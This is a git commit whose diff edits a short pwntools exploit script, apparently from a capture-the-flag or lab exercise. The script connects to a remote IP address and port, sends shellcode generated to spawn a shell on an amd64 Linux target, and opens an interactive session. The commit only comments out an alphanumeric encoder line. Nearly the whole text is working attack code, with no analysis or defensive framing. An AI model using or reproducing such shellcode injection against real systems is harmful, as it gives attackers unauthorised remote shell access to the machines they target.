a12fb4842ea6309cc65b7c98cb7df6c27d5a0304
Hans Tananda <hanstananda@gmail.com>
2021-04-04 15:52:35 +0800

    removed non-working encoder in first attachment

--- attachments_1/test.py
+++ attachments_1/test.py
@@ -3,7 +3,7 @@ context(arch = 'amd64', os = 'linux')
 r = remote('155.69.144.206', 22803)
 cmd = asm(shellcraft.sh())
 # encoder.re_alphanumeric = r'[^A-Z0-9]'
-cmd = encoders.encoder.encode(cmd, expr=r'[^A-Z0-9]')
+# cmd = encoders.encoder.encode(cmd, expr=r'[^A-Z0-9]')
 print(cmd)
 r.send(cmd)
 r.interactive()
